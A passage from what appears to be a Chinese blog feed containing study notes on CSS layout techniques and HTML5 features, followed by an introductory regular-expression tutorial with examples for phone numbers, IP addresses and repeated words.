class="hljs-number">3</span>;<br>  <span class="hljs-attribute">grid-row</span>: <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>等价于</p><p>使用grid-template-areas属性放置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-areas</span>:<br>    <span class="hljs-string">&quot;header header&quot;</span><br>    <span class="hljs-string">&quot;sidebar content&quot;</span><br>    <span class="hljs-string">&quot;footer footer&quot;</span>;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">3</span>fr;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br><span class="hljs-selector-tag">header</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: header;<br>&#125;<br><span class="hljs-selector-tag">article</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: content;<br>&#125;<br><span class="hljs-selector-tag">aside</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: sidebar;<br>&#125;<br><span class="hljs-selector-tag">footer</span> &#123;<br>  <span class="hljs-attribute">grid-area</span>: footer;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="float-浮动"><a href="#float-浮动" class="headerlink" title="float 浮动"></a>float 浮动</h3><p>float属性指定一个元素应沿其容器的左侧或右侧放置，允许文本和内联元素环绕它。该元素从网页的正常流动（文档流）中移除，但是仍然保持部分的流动性（与绝对定位相反）。</p><p>float的常见值：</p><ul><li><code>left</code> — 将元素浮动到左侧。</li><li><code>right</code> — 将元素浮动到右侧。</li><li><code>none</code> — 默认值，不浮动。</li><li><code>inherit</code> — 继承父元素的浮动属性。</li></ul><p><strong>清除浮动：clear</strong></p><ul><li><code>left</code>：停止任何活动的左浮动</li><li><code>right</code>：停止任何活动的右浮动</li><li><code>both</code>：停止任何活动的左右浮动</li></ul><h4 id="清除浮动元素周围的盒子"><a href="#清除浮动元素周围的盒子" class="headerlink" title="清除浮动元素周围的盒子"></a>清除浮动元素周围的盒子</h4><ol><li><p>clearfix小技巧</p><p>先向包含浮动内容及其本身的盒子后方插入一些生成的内容，并将生成的内容清除浮动。</p><p>例如(.wrapper内包裹着浮动元素）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.wrapper</span><span class="hljs-selector-pseudo">::after</span> &#123;<br>  <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-attribute">clear</span>: both;<br>  <span class="hljs-attribute">display</span>: block;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用overflow</p><p>将包裹元素的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/overflow"><code>overflow</code></a> 属性设置为除 <code>visible</code> 外的其他值。</p><p>（例如<code>overflow: auto</code>）</p><p>之所以能够生效，是因为创建了所谓的 <strong>块格式化上下文（BFC）</strong>。但可能会存在一些副作用（莫名其妙的滚动条或裁剪阴影）。</p></li><li><p>display: flow-root</p><p>一个较为现代的方案是使用 <code>display</code> 属性的 <code>flow-root</code> 值。</p><p>它在使用上没什么副作用。</p><p>添加 <code>display: flow-root</code>。</p><p>如果浏览器支持该属性（<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/display#%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E6%80%A7">支持的浏览器列表</a>），盒子就会停止浮动。</p></li></ol><h3 id="position-定位"><a href="#position-定位" class="headerlink" title="position 定位"></a>position 定位</h3><p>定位 (positioning) 能够让我们把一个元素从它原本在正常布局流 (normal flow) 中应该在的位置移动到另一个位置。</p><p><strong>有五种主要的定位类型：</strong></p><ul><li><p><strong>静态定位</strong>（Static positioning）是每个元素<strong>默认</strong>的属性。将元素放在文档布局流的默认位置。</p></li><li><p><strong>相对定位</strong>（Relative positioning）允许我们<strong>相对于</strong><u>元素在正常的文档流中的位置</u><strong>移动</strong>它——包括将两个元素叠放在页面上。</p><p>使用**<code>top</code>,<code>bottom</code>,<code> left</code>, 和<code> right</code>** 来精确指定要将定位元素移动到的位置。</p><p>这对于微调和精准设计（design pinpointing）非常有用。</p></li><li><p><strong>绝对定位</strong>（Absolute positioning）将元素完全从页面的正常布局流（normal layout flow）中移出，<u>类似将它单独放在一个图层中</u>。</p><p>注意，absolute定位的元素应该在文档流中的间隙不再存在。</p><p>我们可以将元素相对于页面的 <code>&lt;html&gt;</code> 元素边缘固定，或者相对于该元素的<u>最近被定位祖先元素</u>（nearest positioned ancestor element）。</p><p>绝对定位在创建复杂布局效果时非常有用，例如通过标签显示和隐藏的内容面板或者通过按钮控制滑动到屏幕中的信息面板。</p><p><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/z-index"><code>z-index</code></a>属性可以用于改变堆叠顺序（默认为auto）。</strong></p></li><li><p><strong>固定定位</strong>（Fixed positioning）与绝对定位非常类似，但是它是将一个元素相对浏览器视口固定，而不是相对另外一个元素。</p><p>这在创建类似在整个页面滚动过程中总是处于屏幕的某个位置的导航菜单时非常有用。</p></li><li><p><strong>粘性定位</strong>（Sticky positioning）是一种新的定位方式，它会让元素先保持和 <code>position: static</code> 一样的定位，当它的相对视口位置（offset from the viewport）达到某一个预设值时，它就会像 <code>position: fixed</code> 一样定位。</p></li></ul><h3 id="multicol-多列布局"><a href="#multicol-多列布局" class="headerlink" title="multicol 多列布局"></a>multicol 多列布局</h3><p>多列布局模组给了我们一种<strong>把内容按列排序</strong>的方式（就像文本在报纸上排列那样）。</p><ul><li><code>column-count</code> ：创建指定数量的列</li><li><code>column-width</code>：设置列宽</li><li><code>column-gap</code>：改变列间间隙。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-rule"><code>column-rule</code></a> ：在列间加入一条分割线。</li><li><code>column-rule</code>：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-rule-color"><code>column-rule-color</code></a> 和 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/column-rule-style"><code>column-rule-style</code></a>的缩写</li></ul><h3 id="响应式设计"><a href="#响应式设计" class="headerlink" title="响应式设计"></a>响应式设计</h3><blockquote><p><strong>响应式 Web 设计不是单独的技术</strong>，它是描述 Web 设计的一种方式、或者是一组最佳实践的一个词，它是用来建立可以<strong>响应</strong>查看内容的设备的样式的一个词。</p></blockquote><p>“响应式设计”这个词是<a href="https://alistapart.com/article/responsive-web-design/">Ethan Marcotte 在 2010 年首度提出的</a>，他将其描述为三种技术的混合使用。</p><ol><li><strong>液态网络Fluid Grids。</strong></li><li><strong>液态图像Fluid images。设置max-width的属性为100%</strong></li><li><strong>媒体查询media query。</strong></li></ol><p>现代布局技术中的<u>多列布局、弹性盒子和网格布局</u>默认都是响应式的。</p><h4 id="媒体查询-media-query"><a href="#媒体查询-media-query" class="headerlink" title="媒体查询 media query"></a>媒体查询 media query</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> media-type <span class="hljs-keyword">and</span> (media-feature-rule) &#123;<br>  <span class="hljs-comment">/* CSS rules go here */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>它由以下部分组成：</p><ul><li><strong>一个媒体类型</strong>，告诉浏览器这段代码是用在什么类型的媒体上的（例如印刷品或者屏幕）；<ul><li>媒体类型，如all、print、screen、speech</li></ul></li><li><strong>一个媒体表达式</strong>，是一个被包含的 CSS 生效所需的规则或者测试；<ul><li>指定宽和高（<code>min-width</code>、<code>max-width</code>、<code>width</code>等）</li></ul></li><li><strong>一组 CSS 规则</strong>，会在测试通过且媒体类型正确的时候应用。</li></ul><p>例子：width小于400时，字体颜色变蓝</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">400px</span>) &#123;<br>  <span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用与and、或or、非not进行连接。</p><h1 id="HTML5新增特性"><a href="#HTML5新增特性" class="headerlink" title="HTML5新增特性"></a>HTML5新增特性</h1><h2 id="多媒体标签"><a href="#多媒体标签" class="headerlink" title="多媒体标签"></a>多媒体标签</h2><p>传统的HTML开发中，如果需要在网页嵌入音频视频，需要使用flash插件。</p><p>在HTML5中，支持多媒体标签。</p><ul><li>音频标签 : <code>&lt;audio&gt; </code></li><li>视频标签 : <code>&lt;video&gt;</code></li></ul><h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><p><strong><code>&lt;audio&gt;</code><strong>html元素用于在文档中嵌入</strong>音频</strong>内容。</p><p><code>&lt;audio&gt;</code>元素可以包含一个或多个音频资源,使用<strong>src属性</strong>或者 **<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/source"><code> &lt;source&gt;</code></a>**来进行描述。</p><p>当浏览器不支持时，会显示标签内的文字。</p><p><code>&lt;audio&gt;</code>支持<u>ogg、mp3、wav</u>三种格式（不同浏览器支持的音频不同）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">audio</span> controls <span class="hljs-attribute">src</span>=&quot;music<span class="hljs-selector-class">.mp3</span>&quot;&gt;这是一个音频&lt;/<span class="hljs-selector-tag">audio</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>controls属性</strong>，值为controls，用于在网页中显示操作控件。</p><h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p><strong><code>&lt;video&gt;</code></strong> 元素 用于在 HTML 或者 XHTML 文档中嵌入<strong>媒体播放器</strong>，用于支持文档内的视频播放。（可以用于音频文件）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;<span class="hljs-selector-tag">video</span> controls <span class="hljs-attribute">width</span>=&quot;<span class="hljs-number">250</span>&quot;&gt;<br>  &lt;source <span class="hljs-attribute">src</span>=&quot;/media/cc0-videos/flower<span class="hljs-selector-class">.webm</span>&quot; type=&quot;<span class="hljs-selector-tag">video</span>/webm&quot; /&gt;<br>  &lt;source <span class="hljs-attribute">src</span>=&quot;/media/cc0-videos/flower<span class="hljs-selector-class">.mp4</span>&quot; type=&quot;<span class="hljs-selector-tag">video</span>/mp4&quot; /&gt;<br>  Download the<br>  &lt;<span class="hljs-selector-tag">a</span> href=&quot;/media/cc0-videos/flower<span class="hljs-selector-class">.webm</span>&quot;&gt;WEBM&lt;/<span class="hljs-selector-tag">a</span>&gt;<br>  or<br>  &lt;<span class="hljs-selector-tag">a</span> href=&quot;/media/cc0-videos/flower<span class="hljs-selector-class">.mp4</span>&quot;&gt;MP4&lt;/<span class="hljs-selector-tag">a</span>&gt;<br>  <span class="hljs-selector-tag">video</span>.<br>&lt;/<span class="hljs-selector-tag">video</span>&gt;<br></code></pre></td></tr></table></figure><p>转码可使用ffmpeg：<a href="http://ffmpeg.org/">http://ffmpeg.org/</a></p><h2 id="表单标签"><a href="#表单标签" class="headerlink" title="表单标签"></a>表单标签</h2><ul><li><p><code>&lt;datalist&gt;</code> 用于定义选项列表，包含一组option元素，配合input使用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;ice-cream-choice&quot;</span>&gt;</span>Choose a flavor:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">list</span>=<span class="hljs-string">&quot;ice-cream-flavors&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ice-cream-choice&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ice-cream-choice&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">datalist</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ice-cream-flavors&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Chocolate&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Coconut&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Mint&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Strawberry&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Vanilla&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">datalist</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p><del><code>&lt;keygen&gt;</code> 规定用于表单的秘钥对生成器字段</del></p></li><li><p><code>&lt;output&gt;</code> 定义不同类型的输出，表示计算或用户操作的结果。</p><p>例如<code>&lt;output name=&quot;result&quot;&gt;&lt;/output&gt;</code></p></li></ul><h2 id="语义化标签"><a href="#语义化标签" class="headerlink" title="语义化标签"></a>语义化标签</h2><p>以下来自菜鸟教程：</p><table><tr><th align="left" width="110">标签</th><th align="left">描述</th></tr><tr><td><a href="https://www.runoob.com/tags/tag-article.html">&lt;article&gt;</a></td><td>定义页面独立的内容区域。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-aside.html">&lt;aside&gt;</a></td><td>定义页面的侧边栏内容。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-bdi.html">&lt;bdi&gt;</a></td><td>允许您设置一段文本，使其脱离其父元素的文本方向设置。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-command.html">&lt;command&gt;</a></td><td>定义命令按钮，比如单选按钮、复选框或按钮</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-details.html">&lt;details&gt;</a></td><td>用于描述文档或文档某个部分的细节</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-dialog.html">&lt;dialog&gt;</a></td><td>定义对话框，比如提示框</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-summary.html">&lt;summary&gt;</a></td><td>标签包含 details 元素的标题</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-figure.html">&lt;figure&gt;</a></td><td>规定独立的流内容（图像、图表、照片、代码等等）。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-figcaption.html">&lt;figcaption&gt;</a></td><td>定义 &lt;figure&gt; 元素的标题</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-footer.html">&lt;footer&gt;</a></td><td>定义 section 或 document 的页脚。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-header.html">&lt;header&gt;</a></td><td>定义了文档的头部区域</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-mark.html">&lt;mark&gt;</a></td><td>定义带有记号的文本。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-meter.html">&lt;meter&gt;</a></td><td>定义度量衡。仅用于已知最大和最小值的度量。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-nav.html">&lt;nav&gt;</a></td><td>定义导航链接的部分。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-progress.html">&lt;progress&gt;</a></td><td>定义任何类型的任务的进度。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-ruby.html">&lt;ruby&gt;</a></td><td>定义 ruby 注释（中文注音或字符）。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-rt.html">&lt;rt&gt;</a></td><td>定义字符（中文注音或字符）的解释或发音。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-rp.html">&lt;rp&gt;</a></td><td>在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-section.html">&lt;section&gt;</a></td><td>定义文档中的节（section、区段）。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-time.html">&lt;time&gt;</a></td><td>定义日期或时间。</td></tr><tr><td><a href="https://www.runoob.com/tags/tag-wbr.html">&lt;wbr&gt;</a></td><td>规定在文本中的何处适合添加换行符。</td></tr></table><h2 id="Canvas-画布"><a href="#Canvas-画布" class="headerlink" title="Canvas 画布"></a>Canvas 画布</h2><p><code>&lt;canvas&gt;</code>是html5中的新元素。用于图形的绘制（需通过脚本完成）。</p><h2 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h2><p>SVG 指可伸缩矢量图形 (Scalable Vector Graphics)。</p><h2 id="Geolocation-地理位置"><a href="#Geolocation-地理位置" class="headerlink" title="Geolocation 地理位置"></a>Geolocation 地理位置</h2><p><strong>地理位置 API</strong>（Geolocation API）允许用户向 web 应用程序提供他们的位置。</p><p>出于隐私考虑，报告地理位置前会先请求用户许可。</p><h2 id="本地存储"><a href="#本地存储" class="headerlink" title="本地存储"></a>本地存储</h2><p>本地存储使用的是cookie，但web存储更加安全和快速。</p><p>因为这些数据不会被存储到服务器上，数据保存在浏览器会话中。</p><p>客户端存储数据的两个对象为：</p><ul><li><strong>localStorage</strong> - 用于<strong>长久保存</strong>整个网站的数据，保存的数据没有过期时间，直到手动去除。</li><li><strong>sessionStorage</strong> - 用于<strong>临时保存</strong>同一窗口(或标签页)的数据，在关闭窗口或标签页之后将会删除这些数据。</li></ul><p>存储的数据以键值对字符串的形式存在。</p><p>可以查看一个<a href="https://www.runoob.com/try/try.php?filename=tryhtml5_webstorage_demo">案例</a>。</p><h2 id="web-worker"><a href="#web-worker" class="headerlink" title="web worker"></a>web worker</h2><p>Web Worker 为 Web 内容在后台线程中运行脚本提供了一种简单的方法。</p><p>html页面在执行脚本时，页面的状态是不可相应的，直到脚本完成。而web worker是运行在后台的JavaScript，独立于其他脚本，不会影响页面的性能。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>Mmdn - 学习web开发：<a href="https://developer.mozilla.org/zh-CN/docs/Learn">https://developer.mozilla.org/zh-CN/docs/Learn</a></p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>html</tag>
      
      <tag>css</tag>
      
      <tag>html5</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式</title>
    <link href="/2023/10/13/2023/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2023/10/13/2023/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>来好好的学习一下正则表达式。</p><p>学习文章：[正则表达式30分钟入门教程][1]</p><p>文本格式约定：<strong>专业术语 元字符&#x2F;语法格式 正则表达式 正则表达式中的一部分(用于分析) <em>对其进行匹配的源字符串</em> 对正则表达式或其中一部分的说明</strong></p><p>在线测试工具：<a href="https://deerchao.cn/tools/wegester/">https://deerchao.cn/tools/wegester/</a></p><h1 id="入门-amp-测试"><a href="#入门-amp-测试" class="headerlink" title="入门&amp;测试"></a>入门&amp;测试</h1><p><strong>Q</strong>:什么是正则表达式？</p><p><strong>A</strong>:查找符合某些规则的字符串 里 <strong>描述规则的工具</strong>。</p><p>查找文件时会使用通配符，*和？，例如寻找所有word文件，可以搜索<code>*.doc</code>.其中的<code>*</code>被解释为任意的字符串。</p><p>类似于通配符，正则表达式也是用来进行文本匹配的工具。但相较于前者，更加精确和复杂。</p><p>例如在一篇小说里寻找hi，可以使用正则表达式hi（这是个最简单的正则表达式）。</p><p>hi可以匹配hi、Hi、HI、hI四种情况（因为忽略了大小写），且history、him等包含hi的词语也会被匹配。</p><p>想要精确查找hi，应该使用<code>\bhi\b</code>。</p><p><strong><code>\b</code>：代表单词的开头或结尾，它只匹配一个位置。</strong></p><p>如果要找的不知hi，例如一个不远处跟着Lucy的hi。应该使用<code>\bhi\b.*\bLucy\b</code>。</p><p>正则表达式规定的特殊字符被称为<strong>元字符</strong>，<code>\b</code>是元字符，<code>.</code>也是一个元字符，<code>*</code>也是。</p><p><strong><code>.</code>：匹配除了换行符以外的任意字符</strong></p><p><strong><code>*</code>：任意次（它和<code>\b</code>和<code>.</code>不同，代表的不是字符也不是位置，而是数量）</strong></p><p>现在来以<code>0\d\d-\d\d\d\d\d\d\d\d</code>来匹配这样一串字符串：</p><p>以0开头，然后是两个数字，一个连字号-，再匹配8个数字。这个也就是国内的电话号码。</p><p><strong><code>\d</code>：用于匹配一个数字</strong></p><p>这里的“-”不是元字符，只能匹配它自身。</p><p>但上面的规则太过繁琐，可以简化为<code>0\d&#123;2&#125;-\d&#123;8&#125;</code>。</p><p>d{2}意为匹配两个数字。</p><h1 id="元字符"><a href="#元字符" class="headerlink" title="元字符"></a>元字符</h1><p>上面学习了<code>\b.*\d</code>这几个很有用的元字符，除此之外还有许多常用元字符。</p><p><strong>以下为常用元字符</strong>：</p><table><thead><tr><th>代码</th><th>说明</th></tr></thead><tbody><tr><td>.</td><td>匹配除换行符以外的任意字符</td></tr><tr><td>\w</td><td>匹配字母或数字或下划线或汉字</td></tr><tr><td>\s</td><td>匹配任意的空白符（包括空格，制表符(Tab)，换行符，中文全角空格等）</td></tr><tr><td>\d</td><td>匹配数字</td></tr><tr><td>\b</td><td>匹配单词的开始或结束</td></tr><tr><td>^</td><td>匹配字符串的开始</td></tr><tr><td>$</td><td>匹配字符串的结束</td></tr></tbody></table><p>现在学习更多的例子。</p><p><code>\ba\w*\b</code>，匹配 以字母a开头的单词——先是某个单词开始处(\b)，然后是字母a,然后是任意数量的字母或数字(\w*)，最后是单词结束处(\b)。</p><p>例如abandon，alpha。</p><p><code>\d+</code>，匹配1个或更多连续的数字。这里的+是和<code>*</code>类似的元字符，不同的是<code>*</code>匹配重复任意次(可能是0次)，而+则匹配重复1次或更多次。</p><p><code>\b\w&#123;6&#125;\b</code> 匹配刚好6个字符的单词。</p><p>元字符**<code>^</code>和<code>$</code>**都匹配一个位置，和<code>\b</code>有点类似。<code>^</code>匹配开头，<code>$</code>匹配结尾。</p><p>例如要求填写的qq号必须为5位到12位数字时，可以使用：<code>^\d&#123;5,12&#125;$</code></p><p>之前例子里的{2}意为重复2次，这里的{5,12}为不少于5，不多于12。</p><h1 id="字符转义"><a href="#字符转义" class="headerlink" title="字符转义"></a>字符转义</h1><p>如果查找元字符本身的话，就需要通过<code>\</code>转义。</p><p>假如寻找<code>.</code>，得使用<code>\.</code></p><p>例如：<code>deerchao\.cn</code>匹配<code>deerchao.cn</code>，<code>C:\\Windows</code>匹配<code>C:\Windows</code>。</p><h1 id="重复"><a href="#重复" class="headerlink" title="重复"></a>重复</h1><p>前面提到的<code>*,+,&#123;2&#125;,&#123;5,12&#125;</code>叫做限定符。</p><p>下面是正则表达式中所有的<strong>限定符</strong>(指定数量的代码，例如*,{5,12}等)：</p><table><thead><tr><th>代码&#x2F;语法</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>重复零次或更多次</td></tr><tr><td>+</td><td>重复一次或更多次</td></tr><tr><td>?</td><td>重复零次或一次</td></tr><tr><td>{n}</td><td>重复n次</td></tr><tr><td>{n,}</td><td>重复n次或更多次</td></tr><tr><td>{n,m}</td><td>重复n到m次</td></tr></tbody></table><h1 id="字符类"><a href="#字符类" class="headerlink" title="字符类"></a>字符类</h1><p>现在已经学习了数字、字母和空白的匹配方法。</p><p>但对于一些没有预定义的元字符的字符合集(比如元音字母a,e,i,o,u)没法搜索。</p><p>这种情况，使用**方括号[]**列出它们即可。</p><p>像[aeiou]就匹配任何一个英文元音字母，[.?!]匹配标点符号(.或?或!)。</p><p>例如一个更复杂的表达式：<code>\(?0\d&#123;2&#125;[) -]?\d&#123;8&#125;</code></p><p>它可以匹配几种格式的电话号码。像(010)88886666，或022-22334455，或02912345678等。</p><p>首先是一个转义字符<code>\(</code>,它能出现0次或1次(<code>?</code>),然后是一个0，后面跟着2个数字(<code>\d&#123;2&#125;</code>)。然后是<code>)</code>或<code>-</code>或空格中的一个。它出现1次或不出现(<code>?</code>)，最后是8个数字(<code>\d&#123;8&#125;</code>)。</p><h1 id="分枝条件"><a href="#分枝条件" class="headerlink" title="分枝条件"></a>分枝条件</h1><p>不幸的是，刚才那个表达式也能匹配010)12345678或(022-87654321这样的“不正确”的格式。</p><p>我们需要用到<strong>分枝条件（指的是有几种规则，如果满足其中任意一种规则都应该当成匹配）</strong>。</p><p><strong>具体方法：用|把不同的规则分隔开。</strong></p><p>例如：</p><p>0\d{2}-\d{8}|0\d{3}-\d{7}&#96;能匹配两种以字号分隔的电话号码。</p><p>一种是3位区号，8位本地号（如012-12345678）</p><p>另一种是4位区号，7位本地号（如0123-1234567）</p><p><strong>使用分枝条件时，要注意各个条件的顺序</strong>。</p><p>匹配分枝条件时，会从左到右的测试每个条件，如果满足了某个分枝，就不会再管其他分枝。</p><h1 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h1><p>前面学习了怎么重复单个字符（直接在字符后面加上限定符就行了）。但如果想要重复多个字符又该怎么办？</p><p>可以使用<strong>小括号()进行分组</strong>。</p><p><code>(\d&#123;1,3&#125;\.)&#123;3&#125;\d&#123;1,3&#125;</code>是一个简单的IP地址匹配表达式。</p><p><code>\d&#123;1,3&#125;</code>匹配1-3位的数字，<code>(\d&#123;1,3&#125;\.)&#123;3&#125;</code>匹配三位数字加上一个英文句号。</p><p>它可以匹配192.168.0.1这种正常的ip地址，但同样可能匹配256.300.888.999这类超出范围的。</p><p>所以只能用较为冗长的分组匹配。</p><p>描述一个正确的ip地址：<code>((2[0-4]\d|25[0-5]|[01]?\d\d?)\.)&#123;3&#125;(2[0-4]\d|25[0-5]|[01]?\d\d?)</code></p><h1 id="反义"><a href="#反义" class="headerlink" title="反义"></a>反义</h1><p>有时需要查找<strong>不属于</strong>某个能简单定义的字符类的字符，比如想查找除了数字以外、其它任意字符都行的情况，这时需要用到<strong>反义</strong>。</p><p><strong>常用的反义代码：</strong></p><table><thead><tr><th>代码&#x2F;语法</th><th>说明</th></tr></thead><tbody><tr><td>\W</td><td>匹配任意不是字母，数字，下划线，汉字的字符</td></tr><tr><td>\S</td><td>匹配任意不是空白符的字符</td></tr><tr><td>\D</td><td>匹配任意非数字的字符</td></tr><tr><td>\B</td><td>匹配不是单词开头或结束的位置</td></tr><tr><td>[^x]</td><td>匹配除了x以外的任意字符</td></tr><tr><td>[^aeiou]</td><td>匹配除了aeiou这几个字母以外的任意字符</td></tr></tbody></table><p>例如：<code>\S+</code>匹配不包含空白符的字符串</p><p><code>&lt;a[^&gt;]+&gt;</code>匹配用尖括号括起来的以a开头的字符串。</p><h1 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h1><p>使用小括号指定一个子表达式后，<strong>匹配这个子表达式的文本</strong>(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。</p><p>默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。（分组0对应整个表达式）</p><p><strong>后向引用</strong>用于<strong>重复搜索前面某个分组匹配的文本</strong>。例如<code>\1</code>代表分组1匹配的文本。</p><p>又例如<code>\b(\w+)\b\s+\1\b</code>可以匹配重复的单词，像go go，cat cat。</p><p>子表达式的<strong>组名可以自行指定</strong>。</p><p>例如<code>(?&lt;Word&gt;\w+)</code>或者<code>(?&#39;Word&#39;\w+)</code>，组名就为Word。</p><p><strong>一些常用分组语法</strong>：</p><table><thead><tr><th>分类</th><th>代码&#x2F;语法</th><th align="left">说明</th></tr></thead><tbody><tr><td><strong>捕获</strong></td><td>(exp)</td><td align="left">匹配exp,并捕获文本到自动命名的组里</td></tr><tr><td></td><td>(?<name>exp)</td><td 